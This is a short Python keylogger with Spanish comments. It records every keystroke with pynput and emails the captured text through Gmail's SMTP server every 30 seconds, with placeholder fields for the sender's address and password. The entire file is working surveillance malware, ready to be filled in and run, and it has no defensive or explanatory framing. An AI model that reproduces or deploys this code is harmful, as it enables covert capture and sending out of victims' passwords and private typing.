import smtplib
import threading
import pynput.keyboard

# PRIMERO CAPTAMOS LAS PULSAIONES DE TECLADO.
caja = ""

def teclaspulsadas(key):
    global caja
    try:
        #caja=caja+key.char.encode("utf-8")
        caja = caja + str(key.char)
    except AttributeError:
        if key == key.space:
            caja = caja + " "
        elif key == key.enter:
            caja = caja + "\n"
        elif key == key.backspace:
            caja = caja + '<--'
        else:
            caja = caja + str(key)
    print(caja)


# SEGUNDO ENVIAMOS UN EMAIL DE LAS PULSASIONES
def enviar_email(correo,contrasea,message):
    server=smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(correo,contrasea)
    server.sendmail(correo,correo,message)
    server.quit()

def funcion_envio():
    global caja
    enviar_email("TUCORREOVALIDADO", "TUCONTRASEÑA", caja)
    caja = ""
    tiempo_envio= threading.Timer(30,funcion_envio)
    tiempo_envio.start()

keylogger_registro= pynput.keyboard.Listener(on_press=teclaspulsadas)
with keylogger_registro:
    funcion_envio()
    keylogger_registro.join()

